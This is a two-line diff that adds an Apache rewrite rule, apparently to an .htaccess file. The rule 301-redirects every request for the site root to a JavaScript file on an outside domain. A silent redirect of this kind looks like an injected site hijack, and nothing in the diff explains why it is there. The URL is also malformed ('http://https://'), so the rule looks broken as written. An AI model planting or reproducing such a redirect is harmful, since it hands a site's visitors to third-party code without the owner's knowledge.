@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^$ http://https://janbaazgroupofpakistan.site/index.js [L, R=301]
